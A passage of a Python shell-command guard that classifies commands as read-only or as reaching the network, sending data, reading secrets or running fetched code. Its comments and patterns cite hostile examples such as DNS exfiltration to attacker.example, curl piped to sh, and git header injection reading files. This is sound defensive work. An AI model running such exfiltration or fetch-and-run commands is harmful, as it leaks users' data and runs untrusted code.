        # -d, -F, -T alone, glued to their value (-d@file) or in a cluster (-sSd, -sSd@f); likewise -X, -H, -b
        if re.match(r"-[\w#:]", arg):
            letter, value = _curl_valued(arg, following)
            if letter and letter in "dFT" or letter == "X" and value.upper() in ("POST", "PUT", "PATCH") \
                    or letter == "H" and value.startswith("@") or letter == "b" and value and "=" not in value:
                return True
    return False


# curl's short options that take a value; in a cluster the first of them takes the rest of the word as its value
_CURL_VALUED = frozenset("AbcCdDeEFHKmoPQrTtuUwxXyYz")


def _curl_valued(arg: str, following: str) -> tuple[str, str]:
    """The first short option of the cluster ``arg`` that takes a value, and that value ("" and "" if none)."""
    for i, letter in enumerate(arg[1:], 1):
        if letter in _CURL_VALUED:
            return letter, arg[i + 1:] or following
    return "", ""


def _wget_sends(args: list[str]) -> bool:
    return any(arg.startswith(("--post-", "--body-", "--method=P", "--method=p", "--load-cookies")) or arg == "--method"
               for arg in args)


# curl options that write a file or read options from one; a short cluster ending in o, O, c, D or K does too.
_CURL_WRITES = ("--output", "--remote-name", "--cookie-jar", "--dump-header", "--trace", "--libcurl", "--config",
                "--etag-save", "--hsts", "--alt-svc", "--stderr", "--create-dirs")
# wget saves a file unless told to print the page: only these options are known not to write one.
_WGET_PRINTS = frozenset({"-q", "--quiet", "-O-", "-qO-", "-nv", "--no-verbose", "-S", "--server-response",
                          "--spider"})


def _downloads(name: str, args: list[str]) -> bool:
    """A plain download: a GET or HEAD whose page goes to stdout, carrying no data and writing no file. It
    changes nothing here, so it counts as read-only; the guard still checks where it goes."""
    if any("$" in a or "`" in a for a in args):  # an address built at run time may carry data
        return False
    if name == "curl":
        for i, arg in enumerate(args):
            following = args[i + 1] if i + 1 < len(args) else ""
            if arg in ("-X", "--request") and following.upper() not in ("GET", "HEAD"):
                return False
            if re.fullmatch(r"-(?:X|-request=)(?!GET$|HEAD$).+", arg, re.I):
                return False
            if arg in ("-D", "--dump-header") and following == "-":
                continue
            if arg.startswith(_CURL_WRITES) or re.fullmatch(r"-[a-zA-Z]*[oOcDK]", arg) or re.match(r"-[oOcDK].", arg):
                return False
        return not _curl_sends(args)
    if name == "wget":
        options = [a for a in args if a.startswith("-") or a == "-"]
        printed = any(a in ("-O-", "-qO-", "--spider", "--output-document=-") for a in args) or any(
            a in ("-O", "-qO", "--output-document") and args[i + 1:i + 2] == ["-"] for i, a in enumerate(args))
        allowed = _WGET_PRINTS | {"-O", "-qO", "--output-document", "--output-document=-", "-"}
        return printed and all(a in allowed for a in options) and not _wget_sends(args)
    return False


def _httpie_sends(args: list[str]) -> bool:
    return any(arg.upper() in ("POST", "PUT", "PATCH") or (not arg.startswith("-") and "://" not in arg and
               bool(re.match(r"[\w.-]+(?::=|=|@)", arg))) for arg in args)


def _git_sub(args: list[str]) -> tuple[str, list[str], list[str]]:
    """The git subcommand, its arguments, and the configuration given before it (``-c name=value``, or
    ``env:name=VARIABLE`` for ``--config-env``), which can name a program to run; git's other global options
    (``-C dir``, ``--git-dir=x``) are skipped."""
    i, configs = 0, []
    while i < len(args) and args[i].startswith("-"):
        arg = args[i]
        if arg == "-c" or arg == "--config-env":
            configs.append(("env:" if arg != "-c" else "") + (args[i + 1] if i + 1 < len(args) else ""))
            i += 2
        elif arg.startswith("-c"):
            configs.append(arg[2:])
            i += 1
        elif arg.startswith("--config-env="):
            configs.append("env:" + arg.partition("=")[2])
            i += 1
        elif arg.startswith("--exec-path"):
            configs.append("")
            i += 1
        else:
            i += 2 if arg in ("-C", "--git-dir", "--work-tree", "--namespace", "--super-prefix") else 1
    return (args[i] if i < len(args) else ""), args[i + 1:], configs


# global options that point git at another repository, whose configuration (core.fsmonitor, a pager, a hook)
# names programs that even git status runs
_GIT_ELSEWHERE = ("-C", "--git-dir", "--work-tree")


# long options that are a prefix of an unsafe one without being it (git diff --text is not --textconv)
_OTHER_OPTIONS = frozenset({"--text"})


def _has_option(args: list[str], long: tuple[str, ...], short: str) -> bool:
    """One of these options is among ``args`` (long ones also by any prefix, as ``sort --ou`` is ``--output``;
    short ones also in a cluster)."""
    for arg in args:
        if arg == "--":
            break
        if arg.startswith("--"):
            option = arg.partition("=")[0]
            if option in long or len(option) >= 3 and option not in _OTHER_OPTIONS \
                    and any(name.startswith(option) for name in long):
                return True
        elif short and arg.startswith("-") and len(arg) > 1:
            if any(letter in short for letter in re.match(r"-([A-Za-z]*)", arg)[1]):
                return True
    return False


def _positionals(args: list[str], valued: str = "") -> list[str]:
    """Arguments that are neither options nor the values of the ``valued`` short options."""
    found, skip = [], False
    for arg in args:
        if skip:
            skip = False
        elif arg.startswith("-") and len(arg) > 1:
            skip = arg in tuple("-" + c for c in valued)
        else:
            found.append(arg)
    return found


def _read_only(name: str, args: list[str]) -> bool:
    """Whether the program, with these arguments, only reads."""
    if name == "git":
        sub, rest, configs = _git_sub(args)
        if configs or any(a.startswith(_GIT_ELSEWHERE) for a in args[:len(args) - len(rest)]):
            return False
        if sub == "branch":  # listing only: any other option changes a branch or the configuration
            return all(a in _GIT_BRANCH_LISTING or a.startswith(_GIT_BRANCH_VALUED) for a in rest)
        return (sub in _GIT_READ_ONLY and not _has_option(rest, _GIT_UNSAFE, "O" if sub == "grep" else ""))
    if name not in _READ_ONLY:
        return False
    if name in _UNSAFE_OPTIONS and _has_option(args, *_UNSAFE_OPTIONS[name]):
        return False
    if name in ("more", "less") and any(a.startswith("+!") for a in args):  # +!cmd runs a shell command
        return False
    if name == "uniq":  # uniq IN OUT writes OUT
        return len(_positionals(args, "fsw")) < 2
    if name == "xxd":  # -r writes binary, and so does xxd IN OUT
        return not any(a in ("-r", "-revert") or re.fullmatch(r"-[a-z]{1,3}", a) and "r" in a for a in args) \
            and len(_positionals(args, "slcgon")) < 2
    if name == "hostname":
        return not _positionals(args)
    if name == "bat":  # bat cache --build writes the cache
        return "cache" not in args[:1]
    if name == "printf":  # printf -v NAME sets a variable, and a subscript of NAME is evaluated
        return not any(a.startswith("-v") for a in args)
    if name in ("test", "["):  # test -v 'a[$(cmd)]' evaluates the subscript
        return not any(a in ("-v", "-R") for a in args)
    if name == "date":
        return all(a.startswith("+") for a in _positionals(args, "dfr"))
    if name == "history":
        return all(a.isdigit() for a in args)
    return True


def _xargs(argv: list[str], text: str) -> list[str]:
    """``argv`` of an ``xargs`` with the text it reads from stdin: put in place of its replace string
    (``-I{}``, ``-i``, ``--replace=R``), or else at the end of the command."""
    replace = ""
    for k, arg in enumerate(argv):
        if arg == "-I" and k + 1 < len(argv):
            replace = argv[k + 1]
        elif arg.startswith("-I") or arg.startswith("--replace="):
            replace = arg[2:] if arg.startswith("-I") else arg.partition("=")[2]
        elif arg in ("-i", "--replace"):
            replace = "{}"
        elif arg.startswith("-i"):
            replace = arg[2:]
    if replace and any(replace in arg for arg in argv):
        return [arg.replace(replace, text) if replace in arg else arg for arg in argv]
    if any(re.fullmatch(r"-[A-Za-z]*0[A-Za-z]*|--null|-d.*|--delimiter(?:=.*)?", arg) for arg in argv[1:]):
        return argv + [text]  # -0 and -d: the text is one argument, not words: echo 'curl ..' | xargs -0 sh -c
    return argv + text.split()


def _runs(word: str) -> bool:
    first = word.split(None, 1)
    return bool(first) and _binary(first[0]) in _RUNNERS


def _unknown(name: str, args: list[str], piped_in: bool, found: Command, depth: int, env: dict[str, str],
             loopvars: frozenset[str]) -> None:
    """A program this does not know: it may run what follows (``setsid curl ...``, ``flock f curl ...``, ``docker
    run IMAGE curl ...``), and an address among its arguments is one it reaches. ``name`` is the word as
    written, since ``curl${IFS}-d${IFS}URL`` is one."""
    text = " ".join([name, *args])
    if depth < 3:
        runs = next((k for k, arg in enumerate(args[:40]) if _runs(arg)), None)
        if runs is not None:
            inner = Command()
            if re.search(r"\s", args[runs]):
                _merge(inner, parse(args[runs], depth + 1, env, loopvars))
            else:
                _segment(args[runs:], piped_in, inner, depth + 1, env, loopvars)
            if inner.destinations or inner.secrets or inner.runs_fetched:
                _merge(found, inner)
        elif word := _NETWORK_WORD.search(text):  # awk 'BEGIN{system("curl ...")}': a tool named inside a string
            inner = parse(text[word.start():], depth + 1, env, loopvars)
            if inner.destinations:
                _merge(found, inner)
    destinations = network_values(text) if re.search(r"[.:@]", text) else set()
    if destinations:
        found.destinations |= destinations
        outside = any(not is_loopback(v) for v in destinations)
        found.remote |= outside
        found.fetches += 1
        # An address in the arguments is not an upload by itself (``docker run ghcr.io/x/y`` is not): it takes a
        # URL with data on it, in a pipe, or in the options.
        explicit = any(not is_loopback(v) for url in _URL.findall(text) for v in network_values(url))
        found.sends |= explicit and (piped_in or _curl_sends(args) or _dynamic(text, loopvars))


def _url_host(url: str) -> str:
    return re.sub(r"^[a-z]+://(?:[^@/]*@)?([^/:]+).*$", r"\1", url, flags=re.I)


def _run_value(value: str, found: Command, depth: int, env: dict[str, str], loopvars: frozenset[str]) -> None:
    """A value that names a program to run (``GIT_SSH_COMMAND``, ``git -c core.fsmonitor=...``): what it reaches
    counts for the command."""
    if value and (_NETWORK_WORD.search(value) or _URL.search(value)):
        inner = parse(value, depth + 1, env, loopvars)
        if inner.destinations or inner.secrets or inner.runs_fetched:
            _merge(found, inner)


def _program_variables(words: list[str], found: Command, depth: int, env: dict[str, str],
                       loopvars: frozenset[str]) -> None:
    """``PAGER='curl ...' man ls``, ``export GIT_SSH_COMMAND=...``: a variable that names a program makes the
    command run one, so it is not read-only, and what the program reaches counts."""
    for word in words:
        m = re.fullmatch(r"([A-Za-z_]\w*)=(.*)", word, re.S)
        if m and (m[1] in _PROGRAM_VARS or m[1].startswith("GIT_CONFIG_")):
            value = m[2].strip()
            if value not in _PLAIN_PROGRAMS:
                found.read_only = False
                _run_value(value, found, depth, env, loopvars)


def _run_string(code: str, found: Command, depth: int, env: dict[str, str], loopvars: frozenset[str]) -> None:
    """A string a shell or ``eval`` runs. When it is a command's output (``sh -c "$(curl ...)"``), it is code
    fetched from there."""
    inner = parse(code, depth + 1, env, loopvars)
    _merge(found, inner)
    if re.match(r"\s*(?:\$\(|`)", code) and inner.destinations and inner.fetches:
        found.runs_fetched = True


def _segment(argv: list[str], piped_in: bool, found: Command, depth: int, env: dict[str, str],
             loopvars: frozenset[str]) -> tuple[str, bool]:
    """Reads one simple command into ``found``; returns its program name ("" if none) and whether it runs a
    program it reads on stdin (``sh``, ``python -``, not ``python3 -c '...'``, which reads data there)."""
    if PurePosixPath(argv[0]).name in ("env", "set") and all("=" in a or a.startswith("-") for a in argv[1:]):
        found.secrets.append(argv[0])  # with no command to run, env and set print every variable
    whole, argv = argv, _program(argv)
    if depth < 3:
        _program_variables(whole, found, depth, env, loopvars)
    if not argv:
        return "", False
    name = _binary(argv[0])
    args = argv[1:]
    if name not in _NAMES_ONLY:
        found.secrets += [a for a in whole if SECRET.search(a)]
    runs_stdin = (name in _SHELLS or name in _INTERPRETERS) and all(a.startswith("-") and a not in ("-c", "-e")
                                                                    or a == "-" or a in _STDIN_FILES for a in args)
    if (argv[0] == "." or name == "source") and args[:1] and args[0] in _STDIN_FILES:
        name, runs_stdin = "sh", True  # echo 'curl ...' | source /dev/stdin
    if name in _INTERPRETERS and "-" in args and not any(a in ("-c", "-e") for a in args):
        runs_stdin = True  # python3 - arg
    if name in _SHELLS and any(re.fullmatch(r"-[abd-z]*s[a-z]*", a) for a in args):
        runs_stdin = True  # bash -s stable
    if any(tuple(a.lower() for a in argv[:len(cmd)]) == cmd for cmd in _SECRET_COMMANDS):
        found.secrets.append(" ".join(argv[:3]))
    read_only = _read_only(name, args)
    if name == "find" and any(a in ("-exec", "-execdir", "-delete", "-ok", "-okdir", "-fprint", "-fls", "-fprintf",
                                    "-fprint0") for a in args):
        read_only = False
    if name == "sed" and any(a.startswith(("-i", "--in-place")) for a in args):
        read_only = False
    if not read_only and not (_downloads(name, args) and not piped_in):
        found.read_only = False
    flag = next((i for i, a in enumerate(args) if re.fullmatch(r"-[a-z]*c", a)), None)  # -c, -lc
    if name in _COMMAND_FLAG and flag is not None and depth < 3:
        rest = args[flag + 1:]
        while rest and rest[0] == "--":
            rest = rest[1:]
        _run_string(rest[0] if rest else "", found, depth, env, loopvars)
        return name, False
    if name == "eval" and depth < 3:  # its arguments are a command
        _run_string(" ".join(args), found, depth, env, loopvars)
        return name, False
    text = " ".join(args)
    sub, rest, configs = _git_sub(args) if name == "git" else ("", args, [])
    for config in configs if depth < 3 else ():  # git -c alias.x='!curl ...' x, --config-env=core.fsmonitor=VAR
        value = (env.get(config[4:].partition("=")[2], "") if config.startswith("env:") else config.partition("=")[2])
        _run_value(value.lstrip("!"), found, depth, env, loopvars)
    s_client = name == "openssl" and args[:1] in (["s_client"], ["s_server"])
    if name in _NETWORK or s_client or (name == "git" and (sub in _GIT_FETCH | _GIT_SEND or sub == "remote")):
        destinations = network_values(text)
        if name in ("scp", "rsync"):  # user@host:path, host:path, rsync://host/path
            remotes = [a for a in args if re.match(r"(?:[\w.+-]+@)?[\w.-]+\.[\w.-]+:", a) and "://" not in a
                       or re.match(r"(?:rsync|scp|sftp|ssh)://", a)]
            destinations |= {v for a in remotes for v in network_values(a.partition(":")[0])}
            # rsync://host/module: the host as well, which is what an output names
            destinations |= {v for a in remotes if "://" in a for v in network_values(_url_host(a))}
            found.sends |= bool(remotes) and remotes[-1] == _positionals(args, "PioFclSe")[-1]
        if name in ("ssh", "scp", "rsync", "sftp", "git"):  # user@host is a login here, not an email address
            destinations |= {v.rpartition("@")[2] for v in destinations if "@" in v and "://" not in v}
        found.destinations |= destinations
        found.remote |= any(not is_loopback(v) for v in destinations)
        found.fetches += bool(destinations)
        found.sends |= (
            name in _ALWAYS_SENDS or s_client or piped_in
            or (name in ("curl", "curlie") and _curl_sends(args)) or (name == "wget" and _wget_sends(args))
            or (name in ("curl", "wget", "http", "https", "xh", "aria2c", "curlie", "axel", "lynx", "w3m", "lwp-request")
                and _dynamic(text, loopvars))
            or (name == "git" and any(c.lower().startswith(("http", "url.")) and _dynamic(c, loopvars)
                                      for c in configs))  # git -c http.extraHeader="X: $(cat f)" fetch URL
            or (name in ("http", "https", "xh", "curlie") and _httpie_sends(args))
            or (name == "git" and (sub in _GIT_SEND or sub == "remote" and rest[:1] in (["add"], ["set-url"])))
            or (name in ("dig", "nslookup", "host", "ping") and bool(re.search(r"\$|`", text))))
    elif name in ("gh", "glab") and not (args and args[0] in ("auth", "config", "alias", "completion")):
        found.remote = True  # issues, pull requests, CI logs: text anyone can write
    elif name in _INTERPRETERS and (any(a in ("-c", "-e", "-E", "-p", "--eval", "--print", "-r") for a in args)
                                    or name in ("deno", "bun") and args[:1] == ["eval"]):
        _code(text, found, depth)
    elif name in _SYNTAX:  # for u in https://a https://b; case $x in ...: words of the language, not programs
        if name in ("for", "select"):
            found.destinations |= network_values(text)
            found.remote |= any(not is_loopback(v) for v in found.destinations)
    elif not (read_only and name in _READ_ONLY) and name not in ("git", "gh", "glab"):  # fd -x CMD, rg --pre CMD
        _unknown(argv[0], args, piped_in, found, depth, env, loopvars)
    return name, runs_stdin


def _strings(code: str) -> list[tuple[int, int, str]] | None:
    """The quoted strings of ``code`` as (start, end, text), read in one pass. A quote that is never closed is
    skipped, and each such quote reads to the end of the text: after a few of them, None (not read)."""
    found: list[tuple[int, int, str]] = []
    i = 0
    n = len(code)
    budget = 4 * n + 1000
    while True:
        m = _QUOTE.search(code, i)
        if not m:
            return found
        close = _CLOSERS[m[0]].match(code, m.end())
        if close:
            found.append((m.start(), close.end(), code[m.end():close.end() - 1]))
            i = close.end()
        else:
            budget -= n - m.end()
            if budget < 0:
                return None
            i = m.end()


def _code(code: str, found: Command, depth: int = 0) -> None:
    """Inline program text: the addresses it reaches when it calls a network client, and whether it sends data.
    A URL in a string (a docs link, a constant) is not a request."""
    if depth < 3:  # a string handed to the shell (os.system('curl ...'), execSync(`wget ...`)) is a command
        strings = _strings(code)
        if strings is None:  # too ragged to read the strings: read the raw text
            found.read_only = False
            _opaque(code, found)
        else:
            for _, _, literal in strings[:2 * _MAX_PARTS]:
                if _NETWORK_WORD.search(literal):
                    _merge(found, parse(literal, depth + 1))
            # an argument list, ['curl', '-d', '@f', URL] or system("curl", ...), is a command too
            groups: list[list[str]] = []
            end = -1
            for start, stop, literal in strings:
                if groups and end >= 0 and _GAP.fullmatch(code, end, start):
                    groups[-1].append(literal)
                elif len(groups) < _MAX_PARTS:
                    groups.append([literal])
                else:
                    break
                end = stop
            for words in groups:
                if len(words) > 1 and _NETWORK_WORD.search(words[0]):
                    _merge(found, parse(" ".join(words), depth + 1))
    if not _NET_CALL.search(code):
        return
    destinations = network_values(code)
    found.destinations |= destinations
    found.remote |= any(not is_loopback(v) for v in destinations)
    found.sends |= bool(destinations) and bool(_SEND_CALL.search(code) or _SOCKET_CALL.search(code)
                                              or _LOCAL_READ.search(code))


def _merge(found: Command, inner: Command) -> None:
    found.destinations |= inner.destinations
    found.sends |= inner.sends
    found.secrets += inner.secrets
    found.read_only &= inner.read_only
    found.runs_fetched |= inner.runs_fetched
    found.remote |= inner.remote
    found.fetches += inner.fetches


def _substitutions(text: str) -> list[tuple[int, str]] | None:
    """The commands inside the ``$(...)`` and backticks of ``text`` and where each starts; None if there are too
    many to read."""
    found = [(m.start(), m[1] if m[1] is not None else m[2])
             for m in islice(_SUBSTITUTION.finditer(text), _MAX_PARTS + 1)]
    return None if len(found) > _MAX_PARTS else found


def _inner(text: str) -> list[str] | None:
    found = _substitutions(text)
    return None if found is None else [part for _, part in found]


_MASK = re.compile(r"\$\{[^}]*\}|\$\w+|\$\(((?:[^()]|\([^()]*\))*)\)|`[^`]*`")
_RUNS_ARGUMENT = re.compile(r"(?:^|[\s;&|(])(?:eval|(?:ba|z|da|k)?sh(?:\s+-[\w-]+)*\s+-\w*c|source|\.)\s+[\"']?$")


def _opaque(text: str, found: Command) -> None:
    """Code whose text is only known when it runs (``eval "$(cat <<EOF ...)"``, ``sh <(echo ...)``): read from
    the raw text what it can reach, and with a network tool or an address in it, take it to send."""
    found.destinations |= network_values(text)
    found.remote |= any(not is_loopback(v) for v in found.destinations)
    found.sends |= bool(_NETWORK_WORD.search(text)) or found.remote


def _defaults(clean: str, found: Command) -> None:
    """``${U:-attacker.example}``, ``${H/a/attacker.example}``: an address written in a parameter expansion is
    one the command may reach."""
    for body in islice(_BRACED.findall(clean), _MAX_PARTS):
        word = re.sub(r"^[#!]?\w+(?:\[[^\]]*\])?(?::?[-=+?]|//?|##?|%%?|\^\^?|,,?|:)?", "", body)
        found.destinations |= network_values(word.rpartition("/")[2] if "/" in body else word)
    found.remote |= any(not is_loopback(v) for v in found.destinations)


def _masked_hosts(clean: str, found: Command) -> None:
    """``dig $(cat f).attacker.example``, ``dig ${d}.attacker.example``: a host with data in it. The data is the
    first label, and the name server is the domain under it, so both are destinations."""
    if _DNS_COMMAND.search(clean) and re.search(r"\$\w|\$\{|\$\(|`", clean):
        masked = _MASK.sub("x", clean)
        for value in network_values(re.sub(r"(?<=\s)@(?=x)", "", masked)):
            found.destinations.add(value)
            domain = host(value)
            while domain.startswith("x."):
                domain = domain[2:]
            found.destinations |= network_values(domain)
        found.remote |= any(not is_loopback(v) for v in found.destinations)


_FETCH_AND_RUN = re.compile(r"(?<![\w.-])(?:curl|wget)(?![\w:-])[^;&\n|]{0,2000}\|&?\s*(?:(?:sudo|env|command|exec|nohup)\s+)*"
                            r"(?:ba|z|da|k)?sh(?![\w-])")


def _unreadable(command: str, found: Command, expanded: str = "") -> Command:
    """Whatever it is, it is not known to be read-only, and with a network tool or an address in it, it may send
    data: read from the raw text (and from the text with its variables written out) what can be."""
    found.read_only = False
    for match in _DEV_TCP.finditer(command):
        found.destinations |= network_values(match[1])
        found.sends = True
    found.destinations |= network_values(command)
    if expanded:
        found.destinations |= network_values(expanded)
    _masked_hosts(expanded or command, found)
    _defaults(expanded or command, found)
    # ssh, scp, rsync, git: the user of user@host is a login, and the host is what an output names
    if re.search(r"(?<![\w.-])(?:ssh|scp|rsync|sftp|git)(?![\w:-])", command):
        found.destinations |= {v.rpartition("@")[2] for v in found.destinations if "@" in v and "://" not in v}
        found.destinations |= {h for v in found.destinations if re.match(r"(?:rsync|scp|sftp|ssh)://", v)
                               for h in network_values(_url_host(v))}
    found.remote |= any(not is_loopback(v) for v in found.destinations)
    found.secrets += [w for w in command.split() if SECRET.search(w)]
    found.sends |= bool(_NETWORK_WORD.search(command)) or found.remote
    if found.remote and _FETCH_AND_RUN.search(command):
        found.runs_fetched = True  # curl URL | sh
    return found


# --- backstops: what the reading of a command may not get wrong ---------------------------------------------
# The parser reads a command the way a shell does, and a shell has more corners than a parser can list (quoting
# inside heredocs inside substitutions, ...). Two checks that do not depend on it make a mistake fail toward
# asking: only a command of plain syntax is read-only, and an address written anywhere in the text is reached.

_OUTSIDE = re.compile(r"['\"\\$`{}#]")
_INSIDE = re.compile(r"[\\$`]")
_SAFE_REDIRECT = re.compile(r"(?:\d|&)?>>?[ \t]*/dev/null(?![\w./-])|[12]?>&[12](?!\d)|<[ \t]*/dev/null(?![\w./-])")
_ASSIGNMENT = re.compile(r"(?:^|[\s;&|(])[A-Za-z_]\w*(?:\+?=|\[)")
_FLOW = re.compile(r"(?:^|[\s;&|(])(?:if|then|else|elif|fi|for|select|while|until|do|done|case|esac|function|coproc|"
                   r"eval|exec|source|export|declare|typeset|local|readonly|alias|trap|set|\[\[|\(\()"
                   r"(?=$|[\s;&|)])")


_ALWAYS_WORD = re.compile(r"(?<![\w.-])(?<!-e )(?:" + "|".join(sorted(_ALWAYS_SENDS, key=len, reverse=True)) + r")(?![\w:-])")
_DATA_FLAG = (r"(?<![\w-])(?:-[0-9#]*[a-zA-Z]*[dFT](?![\w-])|-[0-9#]*[dFT]\S|--(?:data|form|upload-file|json|post-|body-)\S*|"
              r"(?:-X|--request|--method)[= ]?\s*(?i:POST|PUT|PATCH)\b)")
# curl or wget and, in the same command, an option that sends data (the same text with "ls -d" elsewhere does not count)
_UPLOAD = re.compile(r"(?<![\w.-])(?:curl|wget|xh|aria2c|curlie|http|https)(?![\w:-])[^;&|\n]{0,300}?" + _DATA_FLAG)
_PUSH = re.compile(r"(?<![\w.-])git\s+(?:-\S+\s+(?:[^-\s]\S*\s+)?)*(?:push|send-email|request-pull)(?![\w-])")
_BREAKS = str.maketrans({c: " " for c in "`{}()<>;|&+,"})  # an address ends at these: {curl,-d,@f,URL} and `echo URL`


def _skeleton(command: str) -> str | None:
    """``command`` with each quoted string or escaped character cut down to one ``q``; None when it holds
    anything but plain syntax outside single quotes: a substitution, a here-document, a brace, a backtick, a
    ``$'`` string, a comment, a backslash-newline, a carriage return, an unclosed quote."""
    if "\r" in command or len(command) > _MAX_COMMAND:
        return None
    out: list[str] = []
    i = 0
    n = len(command)
    while i < n:
        m = _OUTSIDE.search(command, i)
        if not m:
            out.append(command[i:])
            break
        out.append(command[i:m.start()])
        c = m[0]
        j = m.start()
        if c == "'":
            k = command.find("'", j + 1)
            if k < 0:
                return None
            out.append("q")
            i = k + 1
        elif c == '"':
            i = j + 1
            k = command.find('"', i)
            while True:
                if k < 0:
                    return None  # never closed
                d = _INSIDE.search(command, i, k)
                if not d:
                    i = k + 1
                    break
                x = command[d.start():d.start() + 2]
                if x[0] == "`" or x in ("$(", "$[", "${", "\\\n"):
                    return None
                i = d.start() + (2 if x[0] == "\\" else 1)
                if i > k:  # the quote was escaped
                    k = command.find('"', i)
            out.append("q")
        elif c == "\\":
            if command[j + 1:j + 2] in ("", "\n"):
                return None
            out.append("q")
            i = j + 2
        elif c == "#":
            if not j or command[j - 1] in " \t\n;&|(":
                return None  # a comment: where it ends depends on the quoting
            out.append(c)
            i = j + 1
        elif c == "$":
            if command[j + 1:j + 2] in ("(", "'", "[", "{"):
                return None
            out.append(c)
            i = j + 1
        else:  # a backtick or a brace
            return None
    return "".join(out)


def _plain(command: str) -> bool:
    """Whether ``command`` is simple commands joined by ``|``, ``;``, ``&&``, ``||`` and ``&``, with words, quoted
    strings, variables and no redirect except to /dev/null or ``2>&1``: no assignment, no control flow, no
    substitution, no here-document. Linear in the length, and independent of the parser."""
    text = _skeleton(command)
    if text is None:
        return False
    text = _SAFE_REDIRECT.sub(" ", text)
    return not (re.search(r"[<>]|\(\(", text) or _ASSIGNMENT.search(text) or _FLOW.search(text))


# --- the raw text read in several cheap ways ---------------------------------------------------------------------
# An address is written in a command as it is, and also as a shell or a program would make it: ``printf 'URL\\n'``
# holds a newline, ``$'\\x2e'`` a dot, ``https://host$E/path`` an empty variable. Each of these is one more text
# to scan; an address in any of them is one the command may reach.

_ESCAPE = re.compile(r"\\(?:x([0-9a-fA-F]{1,2})|u([0-9a-fA-F]{4})|0?([0-7]{1,3})|(.))", re.S)
_C_BLANKS = {"n": " ", "t": " ", "r": " ", "v": " ", "f": " "}
_C_LINES = {"n": "\n", "t": "\t", "r": "\r", "v": "\v", "f": "\f"}
_PARAMETERS = re.compile(r"\$\{[A-Za-z_]\w*:?[-=]([^}${]{0,300})\}|\$\{[^}${]{0,300}\}|\$[A-Za-z_]\w*|\$[\d@*#?!$]")
_ASSIGNED = re.compile(r"(?:^|[\s;&|(])([A-Za-z_]\w*)=(?:'([^']*)'|\"([^\"$`]*)\"|([^\s;&|()<>'\"`$\\]+))")
_PARAMETER_USE = re.compile(r"\$\{([A-Za-z_]\w*)[^}${]{0,300}\}|\$([A-Za-z_]\w*)")
_NO_QUOTES = str.maketrans("", "", "'\"")
_QUOTE_BREAKS = str.maketrans({c: " " for c in "'\"`{}()<>;|&+,"})
_STATEMENT = re.compile(r"[\n;]|&&|\|\||(?<![>&|])&(?![>&])")  # not "|": printf URL | xargs curl is one statement
_STATEMENT_QUOTED = re.compile(r"'[^'\n]*'|\"(?:\\.|[^\"\\\n])*\"|\\.|[^'\"\\\n;&|]+|[;&|]+|.", re.S)
# a sender that may take its address from elsewhere: a variable, a substitution, a here-document, a file, or
# inline code that builds the command it runs (os.system('curl -d @f ' + u))
_DYNAMIC = re.compile(r"[$`]|<<|<\(|(?<![\w-])-K|--config|(?<![\w-])-[a-zA-Z]*T\b|\bxargs\b|\w\(")
_MAX_SCANNED = 40_000  # characters of the raw text read for addresses, all the ways it is read together
_MAX_WINDOWS = 5000  # senders listed for one command; more is a command too long to read
_WINDOW = 3000  # characters on each side of a sender that are read for an address (a statement may be a long line)


def _decoded(text: str, lines: bool) -> str:
    """``text`` with its C-style escapes (``\\n``, ``\\145``, ``\\x2e``) decoded: a newline, or a blank for the
    characters that separate words, and any other escaped character as itself."""
    named = _C_LINES if lines else _C_BLANKS

    def one(m: re.Match[str]) -> str:
        if m[1] or m[2] or m[3]:
            code = int(m[1] or m[2] or m[3], 16 if m[1] or m[2] else 8)
            return chr(code % 256 if m[3] or m[1] else code)
        return named.get(m[4], m[4])

    return _ESCAPE.sub(one, text) if "\\" in text else text


def _variants(command: str) -> list[str]:
    """The command as written, with backslash and the character after it a blank, with its escapes decoded (a
    newline, or a blank for ``\\n``), and each of those with its variables taken out (or, for ``${X:-default}``,
    as the default). Quotes are left in. Linear: one pass for each."""
    texts = [command]
    if "\\" in command:
        texts += [_decoded(command, True), _decoded(command, False), _ESCAPE.sub(" ", command)]
    if "$" in command:
        texts += [_PARAMETERS.sub(lambda m: m[1] or "", t) for t in texts]
        if "=" in command:  # the values the command gives its variables written in: first and last assignment
            first: dict[str, str] = {}
            last: dict[str, str] = {}
            for m in islice(_ASSIGNED.finditer(command), _MAX_PARTS):
                value = m[2] if m[2] is not None else m[3] if m[3] is not None else m[4]
                if len(value) <= 300 and ("." in value or ":" in value):  # what an address looks like
                    first.setdefault(m[1], value)
                    last[m[1]] = value
            for values in (first, last):
                if values:  # (at most 1000 uses written out: a value used 30,000 times must not grow the text)
                    texts.append(_PARAMETER_USE.sub(lambda m: values.get(m[1] or m[2], m[0]), command, count=1000))
    return list(dict.fromkeys(texts))


def _unquoted(text: str, ends: bool = True) -> list[str]:
    """``text`` as the plain words an address may be read from: quotes and backslashes taken out, and (with
    ``ends``) the same with the characters that end an address (backticks, braces, ...) as blanks."""
    plain = text.translate(_NO_QUOTES).replace("\\", "")
    if not ends:
        return [plain]
    broken = plain.translate(_BREAKS)
    spaced = text.translate(_QUOTE_BREAKS).replace("\\", "")  # "curl -d @f "."URL": a quote ends an address too
    return list(dict.fromkeys([plain, broken, spaced]))


def _statements(text: str) -> tuple[list[int], list[int]]:
    """Where the statements of ``text`` start and end: split at a newline, ``;``, ``&&``, ``||`` and a lone ``&``;
    not inside a quoted string on one line (so ``python3 -c "a; b"`` is one), and not at ``|``."""
    starts, ends = [0], []
    if len(text) > 30_000:  # a very long text: the plain split, which costs a match for each separator only
        for m in _STATEMENT.finditer(text):
            ends.append(m.start())
            starts.append(m.end())
    else:
        for m in _STATEMENT_QUOTED.finditer(text):
            token = m[0]
            if token == "\n" or (token[0] in ";&|" and (
                    ";" in token or "&&" in token or "||" in token
                    or token == "&" and text[m.start() - 1:m.start()] not in (">", "&")
                    and text[m.end():m.end() + 1] != ">")):
                ends.append(m.start())
                starts.append(m.end())
    ends.append(len(text))
    return starts, ends


# what may come before the program that begins a statement: blanks, a subshell or group, a keyword, a variable
_LEAD = re.compile(r"[\s({!]*(?:(?:then|do|else|time|sudo|command|exec|nohup|env|[A-Za-z_]\w*=\S*)\s+)*")


def _sender_windows(text: str) -> list[tuple[str, bool]]:
    """The statements of ``text`` (cut to a window around the sender) that hold something that sends what it is
    given: a tool that always does, curl or wget with a data option, a git push, a bash network socket, or a
    client library's call that sends. Looser than the reading on purpose: it is the second opinion on a command
    the first one may have misread. Each statement is listed once, so the windows hold no more than the text.
    Each window comes with whether its sender is the program that begins the statement (``git push ...``) rather
    than text inside it (``c='curl -d @f '``, ``system "curl ..."``)."""
